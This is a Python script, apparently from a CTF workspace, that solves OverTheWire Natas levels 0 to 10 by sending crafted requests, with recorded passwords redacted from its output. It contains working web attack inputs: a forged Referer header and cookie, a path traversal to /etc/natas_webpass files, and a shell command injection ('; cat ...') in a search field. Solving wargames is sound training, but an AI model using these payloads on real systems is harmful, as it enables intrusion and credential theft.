"""Run the already documented authorized training requests; redact passwords before display."""
import json,re,sys,hashlib,requests
from pathlib import Path
R=Path('/home/nightingale/CTF/PCGCTF');rows={r['id']:r for r in json.loads((R/'STATUS.json').read_text())['challenges']};mapping={6:0,7:1,8:2,9:3,10:4,12:5,13:6,14:7,15:8,16:9,17:10};i=int(sys.argv[1]);mode=sys.argv[2];level=mapping[i]
def value(row):return row['flag_or_candidate'].split('{',1)[1].rsplit('}',1)[0]
secrets=[value(rows[x]) for x in mapping];current='natas0' if level==0 else value(rows[next(k for k,v in mapping.items() if v==level-1)])
def scrub(text):
 for secret in secrets:text=text.replace(secret,'[REDACTED_LEVEL_PASSWORD]')
 return re.sub(r'(?<![A-Za-z0-9])[A-Za-z0-9]{32}(?![A-Za-z0-9])','[REDACTED_32_CHARACTER_VALUE]',text)
s=requests.Session();s.auth=('natas'+str(level),current);host='http://natas'+str(level)+'.natas.labs.overthewire.org'
def fetch(path='/',**kw):
 r=s.get(host+path,timeout=15,**kw);print('GET',host+path,'HTTP',r.status_code);return r
if mode=='verify':
 name='natas'+str(level+1);url='http://'+name+'.natas.labs.overthewire.org/';r=requests.get(url,auth=(name,value(rows[i])),timeout=15);print('Authenticated account:',name);print('URL:',url);print('HTTP status:',r.status_code);print('Response SHA-256:',hashlib.sha256(r.content).hexdigest());print('Password intentionally not printed.');sys.exit(0 if r.status_code==200 else 2)
if level in [0,1]:r=fetch()
elif level==2:r=fetch('/files/users.txt')
elif level==3:
 a=fetch('/robots.txt');print(scrub(a.text[:600]));r=fetch('/s3cr3t/users.txt')
elif level==4:r=fetch('/',headers={'Referer':'http://natas5.natas.labs.overthewire.org/'})
elif level==5:r=fetch('/',cookies={'loggedin':'1'})
elif level==6:
 a=fetch('/includes/secret.inc');secret=re.search(r'\$secret\s*=\s*["\x27]([^"\x27]+)',a.text)
 if not secret:print('Comparison-secret field not found in actual response.');sys.exit(2)
 r=s.post(host+'/',data={'secret':secret[1],'submit':'Submit'},timeout=15);print('POST',host+'/','HTTP',r.status_code)
elif level==7:r=fetch('/index.php',params={'page':'/etc/natas_webpass/natas8'})
elif level==8:
 r=s.post(host+'/',data={'secret':'oubWYf2kBq','submit':'Submit'},timeout=15);print('POST',host+'/','HTTP',r.status_code)
elif level==9:r=fetch('/',params={'needle':'; cat /etc/natas_webpass/natas10 #','submit':'Search'})
elif level==10:r=fetch('/',params={'needle':'.* /etc/natas_webpass/natas11 #','submit':'Search'})
print('Actual response excerpt, level passwords redacted:')
lines=scrub(r.text).splitlines();chosen=[x for x in lines if any(term in x.lower() for term in ['password','access granted','logged','natas_webpass','<!--','usertest'])]
if chosen:
 for line in chosen[:14]:print(line[:220])
else:
 # Raw endpoint files need not contain a descriptive label.
 for line in lines[:14]:print(line[:220])
print('Response SHA-256:',hashlib.sha256(r.content).hexdigest())
print('No unredacted level password is displayed or saved in this capture.')
